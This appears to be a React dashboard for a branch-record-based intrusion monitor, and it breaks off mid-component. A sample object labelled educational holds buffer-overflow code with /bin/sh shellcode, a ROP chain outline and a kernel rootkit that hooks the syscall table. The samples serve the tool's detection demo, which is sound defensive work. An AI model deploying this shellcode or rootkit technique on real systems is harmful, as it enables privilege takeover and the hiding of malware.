import React, { useState, useEffect, useCallback, useRef } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import {
  Home,
  BarChart3,
  PieChart,
  Shield,
  Settings,
  Bell,
  Search,
  TrendingUp,
  Cpu,
  Eye,
  AlertTriangle,
  Terminal,
  Activity,
  Zap,
  XCircle,
  CheckCircle,
  Bug,
  Code,
  X,
  Wifi,
  HardDrive,
  MemoryStick,
  GitBranch,
  Play,
  AlertOctagon,
  ShieldCheck,
  ShieldAlert,
  Layers,
  Binary,
  CircuitBoard,
  RefreshCw,
  Server,
  Globe,
  Skull,
} from 'lucide-react';

// API Configuration
const API_BASE_URL = 'http://localhost:5001/api';

// API Helper Functions
const api = {
  async get(endpoint) {
    try {
      const response = await fetch(`${API_BASE_URL}${endpoint}`);
      if (!response.ok) throw new Error(`HTTP ${response.status}`);
      return await response.json();
    } catch (error) {
      console.error(`API Error [${endpoint}]:`, error);
      return null;
    }
  },
  
  async post(endpoint, data = {}) {
    try {
      const response = await fetch(`${API_BASE_URL}${endpoint}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data),
      });
      if (!response.ok) throw new Error(`HTTP ${response.status}`);
      return await response.json();
    } catch (error) {
      console.error(`API Error [${endpoint}]:`, error);
      return null;
    }
  }
};

// Animation variants
const containerVariants = {
  hidden: { opacity: 0 },
  visible: {
    opacity: 1,
    transition: {
      staggerChildren: 0.1,
      delayChildren: 0.2,
    },
  },
};

const itemVariants = {
  hidden: { opacity: 0, y: 20, scale: 0.95 },
  visible: {
    opacity: 1,
    y: 0,
    scale: 1,
    transition: {
      type: 'spring',
      stiffness: 100,
      damping: 15,
    },
  },
};

const staggeredListVariants = {
  hidden: { opacity: 0 },
  visible: {
    opacity: 1,
    transition: {
      staggerChildren: 0.05,
    },
  },
};

const listItemVariants = {
  hidden: { opacity: 0, x: -20 },
  visible: { opacity: 1, x: 0 },
};

// Fallback process list (used when API is unavailable)
const generateProcesses = () => [
  { pid: 1, name: 'systemd', status: 'SAFE' },
  { pid: 234, name: 'kthreadd', status: 'SAFE' },
  { pid: 456, name: 'rcu_sched', status: 'SAFE' },
  { pid: 789, name: 'migration/0', status: 'SAFE' },
  { pid: 1024, name: 'ksoftirqd', status: 'SAFE' },
  { pid: 1337, name: 'suspicious.bin', status: 'UNKNOWN' },
  { pid: 1456, name: 'chrome', status: 'SAFE' },
  { pid: 1789, name: 'vscode', status: 'SAFE' },
  { pid: 2001, name: 'node', status: 'SAFE' },
  { pid: 2345, name: 'python3', status: 'SAFE' },
  { pid: 3001, name: 'inject_shell', status: 'UNKNOWN' },
  { pid: 3456, name: 'ssh-agent', status: 'SAFE' },
  { pid: 4000, name: 'bash', status: 'SAFE' },
  { pid: 4567, name: 'kernel_exploit', status: 'UNKNOWN' },
  { pid: 5000, name: 'nginx', status: 'SAFE' },
];

// Malware code samples for demonstration
const malwareCodeSamples = {
  'Buffer Overflow': `// Buffer Overflow Exploit - Educational Demo
#include <string.h>
#include <stdio.h>

void vulnerable_function(char *input) {
    char buffer[64];  // Fixed-size buffer
    
    // VULNERABILITY: No bounds checking!
    strcpy(buffer, input);  // Overflow here
    
    printf("Buffer: %s\\n", buffer);
}

// Shellcode payload (x86_64 execve /bin/sh)
unsigned char shellcode[] = 
    "\\x48\\x31\\xf6"           // xor rsi, rsi
    "\\x48\\xbf\\x2f\\x62\\x69" // movabs rdi, "/bin//sh"
    "\\x6e\\x2f\\x2f\\x73\\x68"
    "\\x57"                     // push rdi
    "\\x48\\x89\\xe7"           // mov rdi, rsp
    "\\x48\\x31\\xd2"           // xor rdx, rdx
    "\\xb0\\x3b"                // mov al, 0x3b
    "\\x0f\\x05";               // syscall

int main() {
    char payload[128];
    memset(payload, 'A', 72);   // Fill buffer + RBP
    *(void**)(payload + 72) = shellcode;
    vulnerable_function(payload);
    return 0;
}`,

  'Return Oriented Programming (ROP)': `; ROP Chain Exploit - Educational Demo
; x86_64 Linux ROP gadgets

section .data
    binsh db "/bin/sh", 0

section .text
global _start

; ROP Gadget Collection:
; 0x401234: pop rdi; ret
; 0x401256: pop rsi; ret  
; 0x401278: pop rdx; ret
; 0x40129a: syscall; ret

; Building execve("/bin/sh", NULL, NULL)
_start:
    ; Stack layout for ROP chain:
    ; [padding to overwrite return addr]
    ; 0x401234        ; pop rdi; ret
    ; addr_of_binsh   ; rdi = "/bin/sh"
    ; 0x401256        ; pop rsi; ret
    ; 0x0             ; rsi = NULL
    ; 0x401278        ; pop rdx; ret
    ; 0x0             ; rdx = NULL
    ; 0x40129a        ; syscall

    mov rax, 59      ; execve syscall number
    lea rdi, [binsh] ; pointer to "/bin/sh"
    xor rsi, rsi     ; argv = NULL
    xor rdx, rdx     ; envp = NULL
    syscall

; KARAN-KAVACH Detection:
; LBR monitors jump addresses
; Detects gadget chaining patterns`,

  'Kernel Bypass': `// Kernel Bypass Technique - Educational Demo
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>

MODULE_LICENSE("GPL");

// Original syscall table pointer
unsigned long *sys_call_table;

// Original sys_read function
asmlinkage ssize_t (*original_read)(int, void*, size_t);

// Hooked sys_read - hides specific files
asmlinkage ssize_t hooked_read(int fd, void *buf, 
                                size_t count) {
    ssize_t ret = original_read(fd, buf, count);
    
    // Rootkit behavior: hide malicious files
    if (ret > 0 && strstr(buf, "malware.bin")) {
        // Filter out the entry
        memset(buf, 0, ret);
    }
    return ret;
}

// Disable write protection on syscall table
void disable_wp(void) {
    write_cr0(read_cr0() & (~0x10000));
}

// Hook installation
int init_module(void) {
    disable_wp();
    sys_call_table[__NR_read] = (unsigned long)hooked_read;
    return 0;
}

// KARAN-KAVACH Counter-measure:
// - Monitor CR0 register modifications
// - Track syscall table integrity
// - LBR detects kernel code redirection`,
};

// Sidebar Component
const Sidebar = ({ processes, onScan, isScanning, onPidSearch, searchPid, setSearchPid, pidSearchResult, activeView, setActiveView, onOpenLBRAnalytics, onOpenSettings }) => {
  const navItems = [
    { icon: Home, label: 'Dashboard', view: 'dashboard' },
    { icon: Shield, label: 'Threat Monitor', view: 'dashboard' },
    { icon: BarChart3, label: 'LBR Analytics', view: 'lbr-analytics' },
    { icon: PieChart, label: 'Reports', view: 'reports' },
    { icon: Settings, label: 'Settings', view: 'settings' },
  ];

  const handleNavClick = (item) => {
    if (item.view === 'lbr-analytics') {
      onOpenLBRAnalytics();
    } else if (item.view === 'settings') {
      onOpenSettings();
    } else {
      setActiveView(item.view);
    }
  };

  return (
    <motion.div
      initial={{ x: -50, opacity: 0 }}
      animate={{ x: 0, opacity: 1 }}
      transition={{ duration: 0.5 }}
      className="w-[240px] h-full flex flex-col py-6 px-4 border-r border-white/5"
    >
      {/* Logo */}
      <div className="mb-6 px-4">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-[#4ceccb] to-[#a855f7] flex items-center justify-center shadow-[0_0_20px_rgba(76,236,203,0.3)]">
            <Shield size={20} className="text-white" strokeWidth={2} />
          </div>
          <div>
            <h1 className="text-white font-bold text-sm tracking-wide">KARAN-KAVACH</h1>
            <p className="text-[#4ceccb] text-[10px] tracking-widest">LBR MONITOR</p>
          </div>
        </div>
      </div>

      {/* Navigation */}
      <nav className="space-y-2 mb-4">
        {navItems.map((item, index) => (
          <motion.div
            key={item.label}
            initial={{ x: -20, opacity: 0 }}
            animate={{ x: 0, opacity: 1 }}
            transition={{ delay: index * 0.1 }}
            whileHover={{ scale: 1.02, x: 5 }}
            onClick={() => handleNavClick(item)}
            className={`flex items-center gap-3 px-4 py-3 rounded-xl cursor-pointer transition-all duration-300 ${
              (activeView === item.view || (item.view === 'dashboard' && activeView === 'dashboard'))
                ? 'shadow-[inset_4px_4px_8px_#111215,inset_-4px_-4px_8px_#2d3138] bg-[#1a1c20]'
                : 'hover:bg-[#1e2024]/50'
            }`}
          >
            <item.icon
              size={18}
              className={(activeView === item.view || (item.view === 'dashboard' && activeView === 'dashboard')) ? 'text-[#4ceccb]' : 'text-gray-500'}
              strokeWidth={1.5}
            />
            <span
              className={`text-sm ${
                (activeView === item.view || (item.view === 'dashboard' && activeView === 'dashboard')) ? 'text-white font-medium' : 'text-gray-500'
              }`}
            >
              {item.label}
            </span>
          </motion.div>
        ))}
      </nav>

      {/* Process Scanner Section */}
      <div className="flex-1 flex flex-col">
        <h3 className="text-gray-400 text-xs uppercase tracking-wider px-4 mb-3">Process Monitor</h3>
        
        {/* PID Search Input */}
        <div className="px-2 mb-3">
          <div className="bg-[#1a1c20] rounded-xl p-2 shadow-[inset_4px_4px_8px_#111215,inset_-4px_-4px_8px_#2d3138]">
            <div className="flex items-center gap-2">
              <Search size={14} className="text-gray-500" />
              <input
                type="text"
                placeholder="Search PID..."
                value={searchPid}
                onChange={(e) => setSearchPid(e.target.value)}
                onKeyDown={(e) => e.key === 'Enter' && onPidSearch()}
                className="bg-transparent text-white text-xs outline-none placeholder:text-gray-600 w-full"
              />
            </div>
          </div>
          {pidSearchResult && (
            <motion.p
              initial={{ opacity: 0, y: -5 }}
              animate={{ opacity: 1, y: 0 }}
              className={`text-xs mt-2 px-2 ${pidSearchResult.found ? 'text-[#4ceccb]' : 'text-[#f53d7a]'}`}
            >
              {pidSearchResult.message}
            </motion.p>
          )}
        </div>

        {/* Process List */}
        <div className="flex-1 mx-2 bg-[#1a1c20] rounded-xl shadow-[inset_4px_4px_8px_#111215,inset_-4px_-4px_8px_#2d3138] overflow-hidden">
          <div className="h-full max-h-[200px] overflow-y-auto p-2 space-y-1">
            <AnimatePresence>
              {processes.map((proc, index) => (
                <motion.div
                  key={proc.pid}
                  variants={listItemVariants}
                  initial="hidden"
                  animate="visible"
                  transition={{ delay: index * 0.02 }}
                  className={`flex items-center justify-between px-2 py-1.5 rounded-lg text-xs ${
                    proc.highlighted ? 'bg-[#4ceccb]/20 ring-1 ring-[#4ceccb]' : ''
                  }`}
                >
                  <div className="flex items-center gap-2 truncate flex-1">
                    <span className="text-gray-500 font-mono w-10">{proc.pid}</span>
                    <span className="text-white truncate">{proc.name}</span>
                  </div>
                  <span className={`text-[10px] font-bold px-1.5 py-0.5 rounded ${
                    proc.status === 'THREAT' 
                      ? 'bg-[#f53d7a]/20 text-[#f53d7a]' 
                      : proc.status === 'SAFE'
                      ? 'bg-green-500/20 text-green-400'
                      : 'bg-yellow-500/20 text-yellow-400'
                  }`}>
                    {proc.status}
                  </span>
                </motion.div>
              ))}
            </AnimatePresence>
          </div>
        </div>

        {/* Scan Button */}
        <motion.button
          whileHover={{ scale: 1.02, y: -2 }}
          whileTap={{ scale: 0.98 }}
          onClick={onScan}
          disabled={isScanning}
          className="mx-2 mt-3 py-3 px-4 rounded-xl bg-gradient-to-r from-[#4ceccb] to-[#a855f7] text-white text-sm font-semibold shadow-[10px_10px_20px_#111215,-5px_-5px_15px_#2d3138] disabled:opacity-50 flex items-center justify-center gap-2"
        >
          {isScanning ? (
            <>
              <motion.div
                animate={{ rotate: 360 }}
                transition={{ duration: 1, repeat: Infinity, ease: "linear" }}
              >
                <Activity size={16} />
              </motion.div>
              Deep Scanning...
            </>
          ) : (
            <>
              <Play size={16} />
              Scan All Running PIDs
            </>
          )}
        </motion.button>
      </div>

      {/* Profile Section */}
      <div className="mt-4 pt-4 border-t border-white/5">
        <div className="flex items-center gap-3 px-4">
          <div className="relative">
            <div className="w-10 h-10 rounded-full bg-gradient-to-br from-[#f53d7a] to-[#a855f7] flex items-center justify-center text-white font-semibold shadow-[0_0_15px_rgba(245,61,122,0.3)]">
              K
            </div>
            <div className="absolute bottom-0 right-0 w-3 h-3 bg-green-500 rounded-full border-2 border-[#1a1c20]"></div>
          </div>
          <div>
            <p className="text-white text-sm font-medium">KAVACH</p>
            <p className="text-gray-500 text-xs">Root Access</p>
          </div>
        </div>
      </div>
    </motion.div>
  );
};

// CPU KPI Card with Live Updates
const CPUKPICard = ({ cpuUsage, kernelConnected }) => (
  <motion.div
    variants={itemVariants}
    whileHover={{ scale: 1.02, y: -5 }}
    className="bg-[#23262b] rounded-2xl p-5 shadow-[10px_10px_20px_#111215,-5px_-5px_15px_#2d3138] transition-all duration-300"
  >
    <div className="flex items-start justify-between mb-4">
      <div className="w-10 h-10 rounded-xl bg-[#1a1c20] shadow-[inset_4px_4px_8px_#111215,inset_-4px_-4px_8px_#2d3138] flex items-center justify-center">
        <Cpu size={18} className="text-[#4ceccb]" strokeWidth={1.5} />
      </div>
      <motion.div
        animate={{ opacity: kernelConnected ? 1 : 0.5 }}
        className={`w-2 h-2 rounded-full ${kernelConnected ? 'bg-green-500' : 'bg-red-500'}`}
        style={{ boxShadow: kernelConnected ? '0 0 10px #22c55e' : '0 0 10px #ef4444' }}
      />
    </div>
    <p className="text-gray-500 text-xs uppercase tracking-wider mb-1">CPU Usage</p>
    <p className="text-white text-2xl font-bold font-mono">
      {kernelConnected ? `${cpuUsage}%` : '._..'}
    </p>
    <div className="mt-2 h-1 bg-[#1a1c20] rounded-full overflow-hidden shadow-[inset_2px_2px_4px_#111215]">
      <motion.div
        className="h-full bg-gradient-to-r from-[#4ceccb] to-[#a855f7]"
        initial={{ width: 0 }}
        animate={{ width: kernelConnected ? `${cpuUsage}%` : '0%' }}
        transition={{ duration: 0.5 }}
      />
    </div>
  </motion.div>
);

// Threat Demo Card Component
const ThreatDemoCard = ({ title, icon: Icon, severity, onShowCode, onExecute, isExecuting, color }) => (
  <motion.div
    variants={itemVariants}
    whileHover={{ scale: 1.02, y: -5 }}
    className="bg-[#23262b] rounded-2xl p-5 shadow-[10px_10px_20px_#111215,-5px_-5px_15px_#2d3138] transition-all duration-300 relative overflow-hidden"
  >
    <div className={`absolute -top-10 -right-10 w-24 h-24 rounded-full blur-3xl opacity-20`} style={{ backgroundColor: color }} />
    
    {/* Executing indicator */}
    {isExecuting && (
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        className="absolute top-2 right-2 flex items-center gap-1"
      >
        <motion.div
          animate={{ scale: [1, 1.2, 1] }}
          transition={{ repeat: Infinity, duration: 1 }}
          className="w-2 h-2 rounded-full bg-red-500"
        />
        <span className="text-xs text-red-400">ACTIVE</span>
      </motion.div>
    )}
    
    <div className="flex items-start justify-between mb-4">
      <div className="w-10 h-10 rounded-xl bg-[#1a1c20] shadow-[inset_4px_4px_8px_#111215,inset_-4px_-4px_8px_#2d3138] flex items-center justify-center">
        <Icon size={18} style={{ color }} strokeWidth={1.5} />
      </div>
      <span className={`text-xs font-bold px-2 py-1 rounded-full`} style={{ backgroundColor: `${color}20`, color }}>
        {severity}% Risk
      </span>
    </div>
    <p className="text-white text-sm font-semibold mb-1">{title}</p>
    <p className="text-gray-500 text-xs mb-3">Memory exploitation vector</p>
    
    <div className="flex gap-2">
      <motion.button
        whileHover={{ scale: 1.05 }}
        whileTap={{ scale: 0.95 }}
        onClick={onShowCode}
        className="flex-1 py-2 rounded-lg bg-[#1a1c20] shadow-[inset_4px_4px_8px_#111215,inset_-4px_-4px_8px_#2d3138] text-xs font-medium flex items-center justify-center gap-2"
        style={{ color }}
      >
        <Code size={14} />
        Code
      </motion.button>
      <motion.button
        whileHover={{ scale: 1.05 }}
        whileTap={{ scale: 0.95 }}
        onClick={onExecute}
        disabled={isExecuting}
        className={`flex-1 py-2 rounded-lg text-xs font-medium flex items-center justify-center gap-2 ${
          isExecuting 
            ? 'bg-red-500/20 text-red-400 cursor-not-allowed' 
            : 'bg-[#1a1c20] shadow-[inset_4px_4px_8px_#111215,inset_-4px_-4px_8px_#2d3138]'
        }`}
        style={{ color: isExecuting ? undefined : '#ef4444' }}
      >
        <Play size={14} />
        {isExecuting ? 'Running...' : 'Execute'}
      </motion.button>
    </div>
  </motion.div>
);

// Progress Ring Component
const ProgressRing = ({ percentage, color, size = 80, strokeWidth = 6, label }) => {
  const radius = (size - strokeWidth) / 2;
  const circumference = radius * 2 * Math.PI;
  const offset = circumference - (percentage / 100) * circumference;

  return (
    <div className="relative flex flex-col items-center" style={{ width: size, height: size + 24 }}>
      <div className="relative" style={{ width: size, height: size }}>
        <svg width={size} height={size} className="transform -rotate-90">
          <circle
            cx={size / 2}
            cy={size / 2}
            r={radius}
            fill="none"
            stroke="#1a1c20"
            strokeWidth={strokeWidth}
          />
          <motion.circle
            cx={size / 2}
            cy={size / 2}
            r={radius}
            fill="none"
            stroke={color}
            strokeWidth={strokeWidth}
            strokeLinecap="round"
            strokeDasharray={circumference}
            initial={{ strokeDashoffset: circumference }}
            animate={{ strokeDashoffset: offset }}
            transition={{ duration: 1.5, ease: 'easeOut' }}
            style={{ filter: `drop-shadow(0 0 8px ${color}50)` }}
          />
        </svg>
        <div className="absolute inset-0 flex items-center justify-center">
          <span className="text-white text-sm font-bold">{percentage}%</span>
        </div>
      </div>
      <p className="text-gray-500 text-xs mt-2">{label}</p>
    </div>
  );
};

// Integrity Score Card - NOW SHOWS REAL DATA
const IntegrityScoreCard = ({ score, onAlert, integrityData, lbrData }) => {
  const getColor = () => {
    if (score >= 85) return '#22c55e';
    if (score >= 70) return '#4ceccb';
    if (score >= 50) return '#f59e0b';
    return '#f53d7a';
  };

  const getStatusText = () => {
    if (score >= 85) return 'SECURE';
    if (score >= 70) return 'GOOD';
    if (score >= 50) return 'WARNING';
    return 'CRITICAL';
  };

  useEffect(() => {
    if (score >= 85) {
      onAlert({ type: 'success', message: 'System integrity is secure' });
    } else if (score < 50) {
      onAlert({ type: 'danger', message: `System integrity critical: ${score}%` });
    }
  }, [score, onAlert]);

  // Get real factors from integrityData
  const factors = integrityData?.factors || {};

  return (
    <motion.div
      variants={itemVariants}
      whileHover={{ scale: 1.01 }}
      className="bg-[#23262b] rounded-2xl p-6 shadow-[10px_10px_20px_#111215,-5px_-5px_15px_#2d3138] relative overflow-hidden"
    >
      <div className="absolute -top-20 -right-20 w-40 h-40 rounded-full blur-3xl" style={{ backgroundColor: `${getColor()}15` }} />
      
      <div className="flex items-center justify-between mb-6">
        <div>
          <h3 className="text-white font-semibold">System Integrity</h3>
          <p className="text-gray-500 text-xs">
            Status: <span className={`font-medium ${score >= 70 ? 'text-green-400' : score >= 50 ? 'text-yellow-400' : 'text-red-400'}`}>
              {getStatusText()}
            </span>
          </p>
        </div>
        <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-[#4ceccb] to-[#a855f7] flex items-center justify-center shadow-[0_0_20px_rgba(76,236,203,0.3)]">
          <ShieldCheck size={24} className="text-white" />
        </div>
      </div>
      
      <div className="flex items-center justify-around">
        <ProgressRing percentage={score} color={getColor()} size={100} strokeWidth={8} label="Overall" />
        <div className="space-y-3">
          <div className="flex items-center gap-2">
            <div className={`w-3 h-3 rounded-full ${factors.kernel_protection !== false ? 'bg-green-500' : 'bg-red-500'}`} />
            <span className="text-gray-400 text-xs">
              Kernel: {factors.kernel_protection !== false ? 'Protected' : 'At Risk'}
            </span>
          </div>
          <div className="flex items-center gap-2">
            <div className={`w-3 h-3 rounded-full ${factors.memory_secured !== false ? 'bg-[#4ceccb]' : 'bg-yellow-500'}`} />
            <span className="text-gray-400 text-xs">
              Memory: {factors.memory_secured !== false ? 'Secured' : 'High Usage'}
            </span>
          </div>
          <div className="flex items-center gap-2">
            <div className={`w-3 h-3 rounded-full ${lbrData?.supported ? 'bg-[#a855f7]' : 'bg-gray-500'}`} />
            <span className="text-gray-400 text-xs">
              LBR: {lbrData?.supported ? 'Active' : 'N/A'}
            </span>
          </div>
          <div className="flex items-center gap-2">
            <div className={`w-3 h-3 rounded-full ${factors.network_safe !== false ? 'bg-green-500' : 'bg-red-500'}`} />
            <span className="text-gray-400 text-xs">
              Network: {factors.network_safe !== false ? 'Safe' : 'Suspicious'}
            </span>
          </div>
        </div>
      </div>
      
      {/* Show deductions if any */}
      {integrityData?.deductions && integrityData.deductions.length > 0 && (
        <div className="mt-4 pt-3 border-t border-white/5">
          <p className="text-gray-500 text-[10px] mb-2">Deductions:</p>
          <div className="space-y-1 max-h-[60px] overflow-y-auto">
            {integrityData.deductions.slice(0, 3).map((d, i) => (
              <p key={i} className={`text-[10px] ${
                d.severity === 'high' ? 'text-red-400' : 
                d.severity === 'medium' ? 'text-yellow-400' : 
                'text-gray-400'
              }`}>
                • {d.reason} ({d.points})
              </p>
            ))}
          </div>
        </div>
      )}
    </motion.div>
  );
};

// LBR Insights Component
const LBRInsights = ({ lbrData }) => {
  const isSupported = lbrData?.supported;
  const hasError = lbrData?.error;
  
  return (
    <motion.div
      variants={itemVariants}
      className="bg-[#23262b] rounded-2xl p-6 shadow-[10px_10px_20px_#111215,-5px_-5px_15px_#2d3138]"
    >
      <div className="flex items-center justify-between mb-4">
        <h3 className="text-white font-semibold">LBR Stack Monitor</h3>
        <div className="flex items-center gap-2">
          <span className={`text-xs px-2 py-1 rounded-full ${
            isSupported 
              ? 'bg-green-500/20 text-green-400' 
              : 'bg-red-500/20 text-red-400'
          }`}>
            {isSupported ? 'Active' : 'Not Available'}
          </span>
          <CircuitBoard size={18} className={isSupported ? "text-[#a855f7]" : "text-gray-500"} />
        </div>
      </div>
      
      {/* CPU Info */}
      <div className="flex items-center gap-2 mb-2">
        <Cpu size={14} className="text-gray-500" />
        <span className="text-gray-400 text-xs">
          {lbrData?.cpu_vendor || 'Unknown'} - {lbrData?.cpu_type || 'Unknown CPU'}
        </span>
      </div>
      
      <p className={`text-xs mb-3 ${isSupported ? 'text-gray-500' : 'text-yellow-500'}`}>
        {lbrData?.analysis || 'Detecting CPU...'}
      </p>
      
      {/* Error Message for Non-Intel CPUs */}
      {hasError && !isSupported && (
        <div className="bg-red-500/10 border border-red-500/20 rounded-xl p-4 mb-3">
          <div className="flex items-start gap-3">
            <AlertTriangle size={18} className="text-red-400 mt-0.5 flex-shrink-0" />
            <div>
              <p className="text-red-400 text-sm font-medium mb-1">LBR Not Supported</p>
              <p className="text-gray-400 text-xs leading-relaxed">{lbrData.error}</p>
            </div>
          </div>
        </div>
      )}
      
      {/* Stats Row - Only show if supported */}
      {isSupported && (
        <>
          <div className="grid grid-cols-2 gap-2 mb-3">
            <div className="bg-[#1a1c20] rounded-lg p-2 shadow-[inset_2px_2px_4px_#111215,inset_-2px_-2px_4px_#2d3138]">
              <p className="text-gray-500 text-[10px]">Total Branches</p>
              <p className="text-[#4ceccb] text-sm font-bold">{(lbrData?.total_branches || 0).toLocaleString()}</p>
            </div>
            <div className="bg-[#1a1c20] rounded-lg p-2 shadow-[inset_2px_2px_4px_#111215,inset_-2px_-2px_4px_#2d3138]">
              <p className="text-gray-500 text-[10px]">Suspicious</p>
              <p className={`text-sm font-bold ${(lbrData?.suspicious_branches || 0) > 0 ? 'text-[#f53d7a]' : 'text-green-400'}`}>
                {lbrData?.suspicious_branches || 0}
              </p>
            </div>
          </div>
          
          {/* Branch Records */}
          <div className="bg-[#1a1c20] rounded-xl p-3 shadow-[inset_4px_4px_8px_#111215,inset_-4px_-4px_8px_#2d3138] max-h-[180px] overflow-y-auto">
            <div className="space-y-2 font-mono text-[10px]">
              {(lbrData?.entries || []).slice(0, 5).map((entry, idx) => (
                <div key={idx} className={`p-2 rounded-lg ${entry.status === 'SUSPICIOUS' ? 'bg-[#f53d7a]/10 border border-[#f53d7a]/20' : 'bg-[#23262b]/50'}`}>
                  <div className="flex items-center justify-between mb-1">
                    <span className="text-gray-400 truncate max-w-[100px]">{entry.process}</span>
                    <span className={`px-1.5 py-0.5 rounded text-[8px] ${entry.status === 'SUSPICIOUS' ? 'bg-[#f53d7a]/20 text-[#f53d7a]' : 'bg-green-500/20 text-green-400'}`}>
                      {entry.status}
                    </span>
                  </div>
                  <div className="flex items-center gap-1 text-gray-500">
                    <GitBranch size={10} className="text-[#4ceccb]" />
                    <span className="text-[#4ceccb]">{entry.from_addr?.slice(-8)}</span>
                    <span>→</span>
                    <span className="text-[#a855f7]">{entry.to_addr?.slice(-8)}</span>
                  </div>
                  <div className="flex items-center justify-between mt-1 text-gray-500">
                    <span>PID: {entry.pid}</span>
                    <span>CPU: {entry.cpu_percent}%</span>
                    <span>{entry.branches} branches</span>
                  </div>
                </div>
              ))}
              {(!lbrData?.entries || lbrData.entries.length === 0) && isSupported && (
                <div className="text-center text-gray-500 py-4">
                  <Activity size={20} className="mx-auto mb-2 opacity-50" />
                  <p>No branch activity detected</p>
                </div>
              )}
            </div>
          </div>
        </>
      )}
      
      {/* Message for non-Intel CPUs */}
      {!isSupported && !hasError && (
        <div className="bg-[#1a1c20] rounded-xl p-4 shadow-[inset_4px_4px_8px_#111215,inset_-4px_-4px_8px_#2d3138] text-center">
          <Activity size={24} className="mx-auto mb-2 text-gray-500 opacity-50" />
          <p className="text-gray-500 text-sm">Cannot fetch LBR data</p>
          <p className="text-gray-600 text-xs mt-1">Not an Intel chip</p>
        </div>
      )}
    </motion.div>
  );
};

// Code Modal Component
const CodeModal = ({ isOpen, onClose, title, code }) => (
  <AnimatePresence>
    {isOpen && (
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        exit={{ opacity: 0 }}
        className="fixed inset-0 z-50 flex items-center justify-center p-4"
        onClick={onClose}
      >
        <div className="absolute inset-0 bg-black/70 backdrop-blur-sm" />
        <motion.div
          initial={{ scale: 0.9, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          exit={{ scale: 0.9, opacity: 0 }}
          onClick={(e) => e.stopPropagation()}
          className="relative w-full max-w-3xl bg-[#23262b] rounded-2xl shadow-[20px_20px_60px_#111215,-10px_-10px_30px_#2d3138] overflow-hidden"
        >
          <div className="flex items-center justify-between p-4 border-b border-white/5">
            <div className="flex items-center gap-3">
              <div className="w-8 h-8 rounded-lg bg-gradient-to-br from-[#f53d7a] to-[#a855f7] flex items-center justify-center">
                <Bug size={16} className="text-white" />
              </div>
              <div>
                <h3 className="text-white font-semibold">{title}</h3>
                <p className="text-gray-500 text-xs">Educational Exploit Code</p>
              </div>
            </div>
            <motion.button
              whileHover={{ scale: 1.1 }}
              whileTap={{ scale: 0.9 }}
              onClick={onClose}
              className="w-8 h-8 rounded-lg bg-[#1a1c20] shadow-[inset_4px_4px_8px_#111215,inset_-4px_-4px_8px_#2d3138] flex items-center justify-center"
            >
              <X size={16} className="text-gray-400" />
            </motion.button>
          </div>
          <div className="p-4 max-h-[60vh] overflow-auto">
            <div className="bg-[#1a1c20] rounded-xl p-4 shadow-[inset_4px_4px_8px_#111215,inset_-4px_-4px_8px_#2d3138]">
              <pre className="text-xs font-mono text-gray-300 whitespace-pre-wrap overflow-x-auto">
                <code>{code}</code>
              </pre>
            </div>
          </div>
          <div className="p-4 border-t border-white/5 flex items-center gap-2">
            <AlertTriangle size={14} className="text-yellow-500" />
            <span className="text-yellow-500 text-xs">For educational purposes only. KARAN-KAVACH detects and prevents these attacks.</span>
          </div>
        </motion.div>
      </motion.div>
    )}
  </AnimatePresence>
);

// Alert Toast Component  
const AlertToast = ({ alert, onClose }) => (
  <AnimatePresence>
    {alert && (
      <motion.div
        initial={{ opacity: 0, y: -50, x: '-50%' }}
        animate={{ opacity: 1, y: 0, x: '-50%' }}
        exit={{ opacity: 0, y: -50, x: '-50%' }}
        className="fixed top-6 left-1/2 z-50"
      >
        <div className={`px-6 py-3 rounded-xl flex items-center gap-3 shadow-[10px_10px_20px_#111215,-5px_-5px_15px_#2d3138] ${
          alert.type === 'success' 
            ? 'bg-green-500/20 border border-green-500/30' 
            : 'bg-[#f53d7a]/20 border border-[#f53d7a]/30'
        }`}>
          {alert.type === 'success' ? (
            <CheckCircle size={20} className="text-green-400" />
          ) : (
            <XCircle size={20} className="text-[#f53d7a]" />
          )}
          <span className={alert.type === 'success' ? 'text-green-400' : 'text-[#f53d7a]'}>
            {alert.message}
          </span>
        </div>
      </motion.div>
    )}
  </AnimatePresence>
);

// Notifications Panel Component
const NotificationsPanel = ({ isOpen, onClose, threats, lbrData, integrityScore }) => {
  const notifications = [];
  
  // Add threat notifications
  if (threats && threats.length > 0) {
    threats.forEach(threat => {
      notifications.push({
        id: `threat-${threat.pid}`,
        type: 'danger',
        title: 'Active Threat Detected',
        message: `${threat.name} (PID: ${threat.pid}) - ${threat.threat_type}`,
        time: 'Now',
        icon: Skull,
      });
    });
  }
  
  // Add LBR warning if not supported
  if (!lbrData?.supported) {
    notifications.push({
      id: 'lbr-warning',
      type: 'warning',
      title: 'LBR Not Available',
      message: `Non-Intel CPU detected (${lbrData?.cpu_vendor || 'Unknown'}). Hardware LBR monitoring unavailable.`,
      time: 'System',
      icon: AlertTriangle,
    });
  }
  
  // Add integrity warning if score is low
  if (integrityScore < 70) {
    notifications.push({
      id: 'integrity-warning',
      type: 'warning',
      title: 'System Integrity Warning',
      message: `System integrity score is ${integrityScore}%. Review security factors.`,
      time: 'Now',
      icon: ShieldAlert,
    });
  }

  return (
    <AnimatePresence>
      {isOpen && (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
          className="fixed inset-0 z-50 flex items-start justify-end p-4 pt-20"
          onClick={onClose}
        >
          <div className="absolute inset-0 bg-black/30" />
          <motion.div
            initial={{ x: 50, opacity: 0 }}
            animate={{ x: 0, opacity: 1 }}
            exit={{ x: 50, opacity: 0 }}
            onClick={(e) => e.stopPropagation()}
            className="relative w-96 bg-[#23262b] rounded-2xl shadow-[20px_20px_60px_#111215,-10px_-10px_30px_#2d3138] overflow-hidden"
          >
            <div className="flex items-center justify-between p-4 border-b border-white/5">
              <div className="flex items-center gap-3">
                <div className="w-8 h-8 rounded-lg bg-gradient-to-br from-[#4ceccb] to-[#a855f7] flex items-center justify-center">
                  <Bell size={16} className="text-white" />
                </div>
                <div>
                  <h3 className="text-white font-semibold">Notifications</h3>
